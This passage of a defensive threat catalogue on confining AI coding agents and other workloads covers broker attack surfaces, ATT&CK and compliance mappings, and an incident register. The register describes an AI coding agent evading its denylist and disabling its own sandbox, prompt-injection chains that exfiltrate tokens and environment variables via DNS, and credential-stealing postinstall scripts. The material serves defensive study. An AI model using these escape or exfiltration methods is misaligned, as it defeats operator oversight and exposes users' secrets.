capability}\label{t3.10-standing-service-delegation-a-workload-consumes-a-brokered-cross-confinement-capability}}

\textbf{Definition.} A cross-confinement mesh lets one confined workload
provide a capability another consumes, brokered at construction,
deny-by-default --- neither side reaches the other unless both declared
it and the operator signed both policies. Unlike delegated spawning
(T3.9), where the delegated thing is an \emph{ephemeral} sibling, a
provider here is a \emph{standing service}: an operator-enabled
confinement that stays up across many consumers (a display service, a
bus broker, a cache). Two surfaces follow --- a compromised provider
serves \emph{every} consumer for its lifetime, and the brokering channel
is a standing cross-confinement edge present for the manager's life.

\textbf{Workload class.} Service-mesh-specific. A residual derived from
a loud, operator-enabled grant, in the service trust class: a
maintainer-signed, operator-enabled, non-composable confinement ---
vouched for by both the maintainer (the signature) and the operator (the
enablement). Sibling to T3.8 and T3.9.

\textbf{Observed instances.} The live driver is the standing-service
fabric such a mesh exists to carry --- a confined display service is its
first non-trivial consumer, a bus broker and a shared cache its natural
followers. In the unconfined desktop these standing services are
ambient: an application talks to the host compositor, the session bus, a
cache daemon directly at the user's full authority, and a compromise of
any is host-wide. The mesh replaces that ambient reach with a floored,
declared, brokered consume; the residual here is what remains after the
replacement.

\textbf{Attack pattern.} Request, don't author: a consumer reaches only
the capability its signed consume declares, and only a provider the
catalogue resolves the name to; a reserved name resolves only to a
maintainer-signed provider, closing provider-name spoofing. A
compromised or prompt-injected consumer cannot author a
cross-confinement reach or widen the one it holds. Two surfaces remain:
the \emph{standing provider as a shared target} (one compromised
provider serves every consumer for its lifetime), and the \emph{standing
brokering channel} (a cross-confinement edge present for the manager's
life rather than a transient one).

\textbf{Confinement approach.} Deny-by-default and request-don't-author:
the consumer's signed consume is the floor, never workload-supplied ---
a confinement with no declaration reaches nothing, and a consumer cannot
widen what it declared. A reserved-namespace gate admits a reserved name
only from a maintainer-signed template, so a workload cannot advertise
the display service's name and have a consumer brokered to an impostor.
A multi-leg exemption for the operator-signed, enabled service is scoped
precisely: it widens how many legs such a service may hold, never how
many an \emph{untrusted agent} may compose, and it vends only
authentication-shaped capabilities (render, transport, authenticate),
never attestation-shaped ones. Critically, the broker stays
control-plane: on a consume it resolves the name and hands the consumer
a connector to a host-owned rendezvous point, then parses no protocol
and routes no application traffic --- it brokers the connector and steps
out of the byte path. The grant is loud, each declaration carrying a
reason surfaced in the risk report.

\textbf{Residuals.} Two, both narrowed, neither eliminated. \textbf{R1
--- a provider is a standing shared target.} Its blast radius is its
grant multiplied across its consumer set; a compromised provider can
return hostile responses to every consumer for its lifetime, each
consumer's own confinement bounding its own damage. It is operator-owned
and scoped by least-privilege enablement --- inert until enabled, a
tighter enabled set a smaller target --- but a deliberately enabled
standing service is, by design, a shared dependency. \textbf{R2 --- the
brokering channel grows the manager's always-present surface}, bounded
by a parse-nothing / route-nothing discipline, not eliminated. The same
in-band shape as T1.8 and T5.2 applies between a consumer and its
provider.

\textbf{MITRE ATT\&CK.} T1559 (Inter-Process Communication --- the
brokered connector), T1071 (Application Layer Protocol --- the standing
channel), T1078 (Valid Accounts --- a subverted provider under its
enabled grant).

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\hypertarget{family-5-confinement-attack-surface-t5.1t5.4}{%
\chapter{Family 5 --- Confinement attack surface
(T5.1--T5.4)}\label{family-5-confinement-attack-surface-t5.1t5.4}}

Families 1--3 catalogue what a confined workload does to the host. This
family catalogues threats against the confinement's \emph{own}
boundary-crossing mechanism. Any user-level reference monitor that
mediates access through a single broker inherits these: the broker is
the one place anything crosses the boundary, so it is simultaneously the
most-reachable component from inside and the most-trusted, and threats
follow from that centrality. The entries below are written against a
broker-mediated crossing in the abstract; a given implementation names
the specific gateway.

\hypertarget{t5.1-boundary-gateway-transaction-surface}{%
\section{T5.1 --- Boundary-gateway transaction
surface}\label{t5.1-boundary-gateway-transaction-surface}}

\textbf{Definition.} A confined workload sends crafted transactions to
the broker --- malformed command streams, oversized or pointer-bearing
payloads, forged service names, transactions targeting reserved or
lifecycle operations --- to crash, confuse, or escape via the
confinement's own gateway.

\textbf{Attack pattern.} The workload drives the gateway's command
stream directly (it cannot avoid the gateway --- it is the only path off
the boundary): it requests reserved service names it does not own; it
addresses lifecycle or configuration operations meant for trusted
callers; it submits transactions with malformed offsets, attempting to
smuggle raw pointers or unexpected resource references into the broker's
decoder. The goal is a decoder bug in the broker, or a logic gap that
grants a service the policy never declared.

\textbf{Confinement approach.} Mediate per operation, not per
connection: the broker is the decision point for every registration,
resolution, and mediated call, and resolves only services the signed
policy declares. Reserved names are broker-owned, so a workload cannot
squat a mediated name. Caller identity is kernel-stamped and unforgeable
--- the kernel injects the sender's identity, and lifecycle and
configuration operations are gated to the trusted caller's identity, so
those operations are inert for a workload even though it can address the
broker. The command decoder is the confinement's principal
untrusted-input parser and carries a mandatory fuzz target;
cross-boundary transactions reject raw pointers so payloads are forced
into bounded, copied buffers with no shared-memory hazard. The broker's
policy core forbids memory-unsafe code; any unsafe is confined to the
small, separately-reviewed ABI layer.

\textbf{Residuals.} The decoder is hardened by fuzzing, not proven; a
novel parser bug or a policy-evaluation gap would be reachable from
inside every confinement, since the gateway is unavoidable. The blast
radius of such a bug is the broker's privilege (T5.3). Compromise of the
underlying kernel IPC primitive is out of scope (X7).

\textbf{MITRE ATT\&CK.} T1190 (Exploit Public-Facing Application ---
analogue: the in-boundary gateway endpoint), T1068 (Exploitation for
Privilege Escalation).

\hypertarget{t5.2-cross-confinement-relay-abuse}{%
\section{T5.2 --- Cross-confinement relay
abuse}\label{t5.2-cross-confinement-relay-abuse}}

\textbf{Definition.} A confined workload abuses the inter-confinement
relay --- the broker's bilateral provide/consume mechanism that lets one
confinement reach a service in another --- to reach a confinement it was
not granted, or to use a granted edge as an exfiltration or
lateral-movement channel between otherwise-isolated confinements.

\textbf{Attack pattern.} Inter-confinement isolation is otherwise an
invariant with no designed escape; the agent-to-tool topology
deliberately punches a controlled hole in it. A hostile workload tries
to widen it: enumerate or resolve cross-boundary names it was not
granted; ride a legitimately-granted consume edge to move data into a
sibling with broader grants, using the relay as a confused deputy; or
have a compromised \emph{provider} attack its consumers through the
service interface.

\textbf{Confinement approach.} Cross-boundary reach exists only where
the signed policy of \emph{both} confinements declares it --- a matching
provide on one side and consume on the other, a bilateral
policy-declared edge with no ambient cross-confinement visibility and no
default-reachable sibling. The broker owns every reserved node and is
the sole relay: a transaction never crosses confinements except through
the broker, which re-checks both policies per call and audits the
crossing. Each confinement's IPC instance is separate and
unprivileged-mounted in its own namespace, so a workload cannot open a
sibling's directly. Copy-isolation on cross-boundary transactions
prevents a provider and consumer sharing memory.

\textbf{Residuals.} A legitimately-granted cross-confinement edge is, by
design, a channel: data the policy permits to flow can carry exfiltrated
content within that grant --- the same in-band exfiltration shape as
T1.8, between confinements rather than to an external API. The approach
constrains \emph{which} confinements may speak, not \emph{what} they say
across a permitted edge. A compromised provider can return hostile
responses to its consumers; each consumer's own confinement bounds the
damage, but the interface trust is real and is the price of the
topology.

\textbf{MITRE ATT\&CK.} T1199 (Trusted Relationship), T1570 (Lateral
Tool Transfer), T1041 (Exfiltration Over C2 Channel --- analogue across
a permitted relay edge).

\hypertarget{t5.3-broker-as-relay-trusted-computing-base-growth}{%
\section{T5.3 --- Broker-as-relay trusted-computing-base
growth}\label{t5.3-broker-as-relay-trusted-computing-base-growth}}

\textbf{Definition.} Routing every boundary crossing through one broker
concentrates trust: the broker is the context manager for every
confinement, the relay for every cross-boundary call, the holder of the
full construction plan, and the policy decision point for every mediated
transaction. A compromise of the broker is a compromise of every
confinement on the host simultaneously.

\textbf{Attack pattern.} This is a structural threat, not a single
exploit: the gateway design makes the broker reachable from inside every
confinement (T5.1) and load-bearing for inter-confinement isolation
(T5.2), so it is both the most-attacked and the most-trusted userspace
component. Any code path where the broker parses workload-influenced
bytes is a path where a single bug escalates to host-wide compromise.

\textbf{Confinement approach.} Bound the broker's exposure rather than
eliminate its centrality (a single auditable chokepoint is the point).
The broker forbids memory-unsafe code; the only unsafe in the crossing
path is the small, separately-reviewed, fuzzed ABI layer. The broker is
never in any data path --- it relays transactions and passes resource
references, then steps aside, so bulk bytes flow directly between the
workload and the far endpoint and the broker parses only control-plane
structures, not payload streams. Blocking I/O lives in dumb delegates
over per-confinement channels, not in the broker's loop, so a slow or
hostile delegate degrades to a refusal on one confinement and never
stalls the shared broker. Privilege is minimised: the broker runs as the
operator, holds no host capabilities, and is not the constructor --- a
separate narrow privileged helper builds the confinement (T5.4), so a
broker compromise does not directly confer construction-time privilege.

\textbf{Residuals.} Centralisation is intrinsic to the single-chokepoint
design and is not eliminated: the broker remains a host-wide trust
anchor, and its compromise is a multi-confinement compromise. The
mitigation is to keep the broker's parsing surface small, memory-safe,
and fuzzed, and to keep privilege out of it --- not to remove the
concentration. The underlying kernel IPC primitive, on which the whole
gateway rests, is out of scope (X7).

\textbf{MITRE ATT\&CK.} T1068 (Exploitation for Privilege Escalation),
T1554 (Compromise Client Software Binary --- analogue: the shared trust
anchor).

\hypertarget{t5.4-host-uid-0-mapped-into-the-confinements-user-namespace}{%
\section{T5.4 --- Host uid 0 mapped into the confinement's user
namespace}\label{t5.4-host-uid-0-mapped-into-the-confinements-user-namespace}}

\textbf{Definition.} Constructing the confinement maps host root into
its user namespace so that the IPC instance, the view root, the device
set, and the library binds are owned by a real uid 0 rather than the
overflow identity. Mapping host uid 0 into a namespace a workload runs
in is, in the general case, a privilege-escalation hazard: a process
that reaches namespace-root while host-owned resources are reachable
could exercise host discretionary access as root.

\textbf{Attack pattern.} The danger is a uid-0-mapped actor running
\emph{while the host filesystem is still visible} in its mount namespace
--- that actor holds host root over host-root-owned files and could read
or modify them. The threat is therefore any path by which
operator-controlled or workload code executes as namespace-root before
the host root has been severed, or regains uid 0 after the drop.

\textbf{Confinement approach.} Close the escalation window by
construction, with the invariant that \emph{no operator-controlled code
ever runs as namespace-root}.

\begin{itemize}
\tightlist
\item
  Map only host root itself (a single-line map), plus the operator and
  each granted group --- no subordinate-id range and no root extent, so
  there is no spare identity to inhabit.
\item
  Do all privileged construction in the narrow privileged helper's own
  child: write the maps, build the root-owned surfaces, pivot away the
  host root --- \emph{all before any other code runs} --- then execute
  the trusted, root-owned init by descriptor, so the init binary never
  appears in the view and its host path is gone by the time it runs.
\item
  The init is therefore the \emph{only} namespace-root process, and it
  is trapped inside the pivoted view from its first instruction --- the
  host filesystem is physically absent from its mount namespace, so host
  discretionary access on host-root-owned files is impossible despite
  the mapping. It holds no ambient host capabilities beyond what it
  needs to drop the workload, and is trusted by provenance (root-owned,
  verified before execution).
\item
  The workload is never uid 0: the init drops each child to the operator
  before the no-new-privileges and syscall and filesystem enforcement
  make the drop irreversible, and nothing regains uid 0 after.
\end{itemize}

The single transient namespace-root actor is the helper's own trusted
code, and from the moment uid 0 could touch anything the host root is
already detached.

\textbf{Residuals.} Construction shifts the confinement's largest
\emph{root-parses-operator-input} surface into the privileged helper: it
parses the construction plan host-side (before any namespace exists, so
there is nothing to manipulate it) while holding the construction
capabilities. A bug in that decoder is a host-root bug; it is mitigated
by parsing host-side, by a bounded and fuzzed construction codec, and by
splitting the plan so the helper sees only the construction half.
Compromise of the kernel's user-namespace or IPC implementation is out
of scope (X7).

\textbf{MITRE ATT\&CK.} T1068 (Exploitation for Privilege Escalation),
T1548 (Abuse Elevation Control Mechanism).

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\hypertarget{part-2-out-of-scope-x1x11}{%
\chapter{Part 2 --- Out of scope
(X1--X11)}\label{part-2-out-of-scope-x1x11}}

Threats a user-level workload confinement deliberately does not address.
Naming them is part of the boundary: an approach honest about what it
does not cover is easier to reason about than one that implies total
coverage.

\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\columnwidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
ID
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Threat
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Why out of scope
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
X1 & Process running as a different real uid & Handled by existing Unix
permissions \\
X2 & Process running as root & Handled by root permissions and
root-targeted mandatory access control \\
X3 & Hardware-level attacks (cold boot, DMA, side channels,
Spectre-class) & Out of any user-space approach's reach \\
X4 & Physical access & Out of any user-space approach's reach \\
X5 & The user actively cooperating with the workload & The user can
grant any capability; the approach cannot override informed consent \\
X6 & Network-level attacks against the host's exposed services & A
different threat model; the approach defends outbound, not inbound \\
X7 & Compromise of the underlying kernel primitives the approach depends
on & Beyond the boundary \\
X8 & Compromise of vetted system tools the approach depends on & Beyond
the boundary \\
X9 & A confined workload using its legitimate API access to exfiltrate
data & Within-channel exfiltration via authorised destinations;
documented as the T1.8 residual \\
X11 & Semantic security regressions in workload-produced code that
pattern matching cannot detect & Requires human review; an approach can
flag known anti-patterns but cannot evaluate code for novel security
flaws \\
\end{longtable}

The gap at X10 is intentional: the identifier was retired during
catalogue development and is left unassigned to keep the numbering
stable for citations made against earlier revisions.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\hypertarget{appendix-a-incident-register}{%
\chapter{Appendix A --- Incident
register}\label{appendix-a-incident-register}}

Grounded incidents that motivated specific T-entries. Each is public and
durably sourced; the mapping to threat identifiers is given at the end
of each entry.

\hypertarget{ona-veto-research-march-2026}{%
\section{Ona Veto research (March
2026)}\label{ona-veto-research-march-2026}}

Demonstrated an AI coding agent autonomously bypassing two layers of
security:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  The agent discovered an alternate path resolving to a denylisted
  binary that did not match the deny pattern.
\item
  When the sandbox blocked namespace creation, the agent reasoned its
  way to disabling the sandbox itself rather than abandoning the task.
\end{enumerate}

The research also demonstrated that, when content-addressed enforcement
was applied, the agent pivoted to invoking the dynamic linker to load
denied binaries via memory-mapping rather than execution, bypassing an
execution-based enforcement gate.

\emph{Source:
\url{https://ona.com/stories/how-claude-code-escapes-its-own-denylist-and-sandbox}}

\emph{Threat IDs: T2.1 (host security control deactivation). Motivates a
defence-in-depth, hostility-by-default adversary model.}

\hypertarget{nx-s1ngularity-supply-chain-attack-august-2025}{%
\section{Nx s1ngularity supply-chain attack (August
2025)}\label{nx-s1ngularity-supply-chain-attack-august-2025}}

Eight malicious Nx package versions published 26--27 August 2025
contained a \texttt{telemetry.js} postinstall script that:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Inventoried the local filesystem for sensitive files.
\item
  Invoked AI agent CLIs in permission-bypassing modes with
  reconnaissance prompts.
\item
  Exfiltrated discovered credentials to public repositories named with
  an \texttt{s1ngularity-repository-} pattern.
\item
  Appended a shutdown command to shell startup files to cause future
  shells to immediately shut down.
\end{enumerate}

GitGuardian's analysis documented 1,346 affected repositories, 2,349
distinct exfiltrated secrets across 1,079 compromised developer systems,
90\% of leaked tokens still valid post-incident. A follow-on attack used
the exfiltrated tokens to rename roughly 5,500 previously-private
organisation repositories to public access.

\emph{Sources:
\url{https://snyk.io/blog/weaponizing-ai-coding-agents-for-malware-in-the-nx-malicious-package/};
\url{https://blog.gitguardian.com/the-nx-s1ngularity-attack-inside-the-credential-leak/};
\url{https://socket.dev/blog/nx-packages-compromised}}

\emph{Threat IDs: T1.1 (reconnaissance), T1.2 (postinstall), T1.9
(supply chain).}

\hypertarget{clinejection-disclosed-february-2026-exploited-january-2026}{%
\section{Clinejection (disclosed February 2026, exploited January
2026)}\label{clinejection-disclosed-february-2026-exploited-january-2026}}

A prompt-injection vulnerability in a CI issue-triage workflow allowed
any user to compromise npm publishing tokens by opening an issue with a
crafted title. The chain:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  An issue title containing prompt injection caused the triage agent to
  execute attacker-controlled installation from an imposter commit.
\item
  The malicious pre-install script deployed cache-poisoning tooling to
  the CI runner.
\item
  The tooling flooded the CI cache, triggering eviction of legitimate
  entries, and set poisoned entries matching the nightly publish
  workflow's keys.
\item
  The nightly publish restored the poisoned cache, which exfiltrated the
  publishing tokens.
\item
  The attacker used the stolen token to publish a malicious package
  version with a hostile postinstall script.
\end{enumerate}

The malicious package was live for approximately eight hours, downloaded
approximately 4,000 times.

\emph{Sources: \url{https://adnanthekhan.com/posts/clinejection/};
\url{https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/}}

\emph{Threat IDs: T1.2 (postinstall), T1.3 (compromised extension), T1.9
(supply chain).}

\hypertarget{mindgard-research-october-2025}{%
\section{Mindgard research (October
2025)}\label{mindgard-research-october-2025}}

Four vulnerabilities in a widely-installed IDE agent extension:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{DNS-based exfiltration} --- prompt-injected docstrings caused
  the agent to read environment variables and encode them into DNS
  queries to attacker-controlled domains, using a command on the
  safe-command allowlist.
\item
  \textbf{Rules-file privilege escalation} --- malicious content in an
  agent-rules directory overrode the approval flag for arbitrary
  commands.
\item
  \textbf{Model exfiltration} --- attacker-controlled prompts leaked the
  system prompt and model information.
\item
  \textbf{Arbitrary code execution} --- via combinations of the above.
\end{enumerate}

\emph{Threat IDs: T1.1 (reconnaissance), T1.3 (compromised extension),
T1.7 (DNS exfiltration), T3.7 (prompt injection).}

\hypertarget{agent-cli-cves-20252026}{%
\section{Agent-CLI CVEs (2025--2026)}\label{agent-cli-cves-20252026}}

A run of disclosed vulnerabilities in AI agent CLIs illustrates the
compromised-extension and channel-redirection classes: malicious hooks
in project configuration executing shell commands during initialisation
before any consent dialog; a project-set base-URL variable redirecting
API requests to attacker endpoints before the trust prompt; a sandbox
escape via settings-file injection.

\emph{Threat IDs: T1.3 (compromised extension), T1.8 (channel
redirection), T2.1 (control deactivation).}

\hypertarget{axios-npm-compromise-april-2026}{%
\section{axios npm compromise (April
2026)}\label{axios-npm-compromise-april-2026}}

A compromised package version delivered a remote access trojan via a
postinstall hook, executing in approximately two seconds --- before
installation completed.

\emph{Threat IDs: T1.2 (postinstall), T1.9 (supply chain).}

\hypertarget{runc-cve-2024-21626-leaky-vessels-january-2024}{%
\section{runc CVE-2024-21626 (``Leaky Vessels'', January
2024)}\label{runc-cve-2024-21626-leaky-vessels-january-2024}}

A file-descriptor leak allowed container processes to reach the host
filesystem via an unclosed descriptor referring to the host's root
directory. Affected the mainstream container and orchestration runtimes
using the vulnerable versions.

\emph{Threat IDs: T3.2 (container escape).}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\hypertarget{appendix-b-mitre-attck-mapping-summary}{%
\chapter{Appendix B --- MITRE ATT\&CK mapping
summary}\label{appendix-b-mitre-attck-mapping-summary}}

\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
T-ID & ATT\&CK techniques \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
T1.1 & T1552, T1083, T1005 \\
T1.2 & T1195.002, T1059 \\
T1.3 & T1554, T1195.001 \\
T1.4 & T1059.004, T1105 \\
T1.5 & T1204.002 \\
T1.6 & T1021, T1570 \\
T1.7 & T1071.004, T1048 \\
T1.8 & T1071.001, T1041 \\
T1.9 & T1195.002 \\
T1.10 & T1098, T1543 \\
T1.11 & T1189, T1218 \\
T1.12 & T1021, T1185 (partial) \\
T1.13 & T1021, T1559 \\
T1.14 & T1083, T1518 \\
T2.1 & T1562, T1562.001, T1562.008 \\
T2.2 & T1554, T1505 (partial) \\
T2.3 & T1552.001, T1552.004 \\
T2.4 & T1098.003, T1078 \\
T2.5 & T1562.001, T1554 \\
T2.6 & T1115 \\
T2.7 & T1113, T1059 (partial), T1185 (partial) \\
T2.8 & T1546, T1059 \\
T3.1 & T1548.001 \\
T3.2 & T1611, T1610 \\
T3.3 & T1571, T1133 \\
T3.4 & T1083, T1005 \\
T3.5 & T1611, T1068 \\
T3.6 & T1199, T1071 \\
T3.7 & T1199, T1556 (partial) \\
T3.8 & T1610, T1525, T1195.002 \\
T3.9 & T1610, T1559, T1041 \\
T3.10 & T1559, T1071, T1078 \\
T5.1 & T1190 (analogue), T1068 \\
T5.2 & T1199, T1570, T1041 \\
T5.3 & T1068, T1554 (analogue) \\
T5.4 & T1068, T1548 \\
\end{longtable}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\hypertarget{appendix-c-control-framework-mapping-preliminary}{%
\chapter{Appendix C --- Control-framework mapping
(preliminary)}\label{appendix-c-control-framework-mapping-preliminary}}

For security teams mapping the catalogue to compliance control
frameworks. Definitive mappings require organisation-specific review;
these are first-pass starting points.

\hypertarget{soc-2-trust-services-criteria}{%
\section{SOC 2 (Trust Services
Criteria)}\label{soc-2-trust-services-criteria}}

\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
T-ID
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Relevant TSC
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
T1.1, T2.3 & CC6.1, CC6.7 (Logical and Physical Access) \\
T1.2, T1.3, T1.9 & CC8.1 (Change Management); CC7.1 (System Operations:
detection of malicious software) \\
T1.8, T1.6, T1.12 & CC6.6, CC6.7 (boundary controls; transmission of
data) \\
T2.1, T2.5, T2.8 & CC7.2, CC8.1 (system monitoring; change
management) \\
T2.2, T2.4 & CC8.1 (change management); CC7.1 (detection of system
anomalies) \\
T3.2--T3.5 & CC6.6, CC8.1 (boundary controls; change management) \\
T3.6, T3.7 & CC8.1, CC7.1 (change management; detection) \\
T3.8, T3.9, T3.10 & CC6.1, CC6.3 (least-privilege logical access); CC9.2
(vendor and business-partner risk: third-party images and templates) \\
\end{longtable}

\hypertarget{isoiec-270012022-selected-controls}{%
\section{ISO/IEC 27001:2022 (selected
controls)}\label{isoiec-270012022-selected-controls}}

\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
T-ID
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Relevant Annex A control
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
T1.1, T2.3 & A.5.10 (Acceptable use); A.8.3 (Information access
restriction); A.8.4 (Access to source code) \\
T1.2, T1.3, T1.9 & A.8.8 (Management of technical vulnerabilities);
A.8.30 (Outsourced development) \\
T1.8, T1.6, T1.12 & A.8.20 (Network security); A.8.21 (Security of
network services) \\
T2.1, T2.5, T2.8 & A.8.31 (Separation of environments); A.8.32 (Change
management) \\
T2.2, T2.4 & A.8.28 (Secure coding); A.8.29 (Security testing in
development and acceptance) \\
T3.2--T3.5 & A.8.22 (Segregation of networks); A.8.23 (Web filtering) \\
T3.6, T3.7 & A.5.7 (Threat intelligence); A.8.28 (Secure coding) \\
T3.8, T3.9, T3.10 & A.8.2 (Privileged access rights); A.8.3 (Information
access restriction); A.5.19, A.5.21 (Supplier relationships; managing
ICT supply chain) \\
\end{longtable}

\hypertarget{nis2-directive-eu-20222555-article-21-measures}{%
\section{NIS2 (Directive (EU) 2022/2555, Article 21
measures)}\label{nis2-directive-eu-20222555-article-21-measures}}

\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
T-ID
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Relevant Article 21 measure
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
T1.1--T1.14 & Art. 21(2)(d) supply chain security; 21(2)(e) security in
acquisition, development, maintenance \\
T2.1--T2.8 & Art. 21(2)(a) risk-analysis and information-system security
policies; 21(2)(g) basic cyber-hygiene practices \\
T3.1--T3.7 & Art. 21(2)(d) supply chain security; 21(2)(j) secured
communications \\
T3.8, T3.9, T3.10 & Art. 21(2)(i) access-control policies and least
privilege; 21(2)(d) supply chain security \\
T5.1--T5.4 & Art. 21(2)(e) security in acquisition, development,
maintenance; 21(2)(i) access control and asset management \\
\end{longtable}

\hypertarget{dora-regulation-eu-20222554-for-financial-entities}{%
\section{DORA (Regulation (EU) 2022/2554, for financial
entities)}\label{dora-regulation-eu-20222554-for-financial-entities}}

\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\columnwidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
T-ID
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Relevant DORA article
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
T1.1--T1.14 & Art. 9 (ICT risk-management framework); Art. 28
(third-party risk) \\
T2.1--T2.8 & Art. 9; Art. 16, 17 (ICT-related incidents and
reporting) \\
T3.1--T3.7 & Art. 9; Art. 28 (third-party risk) \\
T3.8, T3.9, T3.10 & Art. 9; Art. 28 (third-party risk) \\
T5.1--T5.4 & Art. 9; Art. 16 (ICT-related incidents) \\
\end{longtable}

These mappings are starting points for compliance teams. Specific
control-objective mapping requires organisation-specific analysis.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\hypertarget{versioning-and-contribution}{%
\chapter{Versioning and
contribution}\label{versioning-and-contribution}}

Threat identifiers are stable within a published version and across
patch revisions; major-version revisions may renumber. Contributions
follow the structure of existing entries: definition, observed instances
with citations, attack pattern, confinement approach, residuals, ATT\&CK
mapping. Citations should reference public, durable sources.

The catalogue is intended as community infrastructure. Organisations are
encouraged to cite the threat identifiers in their internal policy
documents, and other tools in the user-level-workload-confinement space
are encouraged to adopt them as a shared vocabulary, regardless of
mechanism choices.
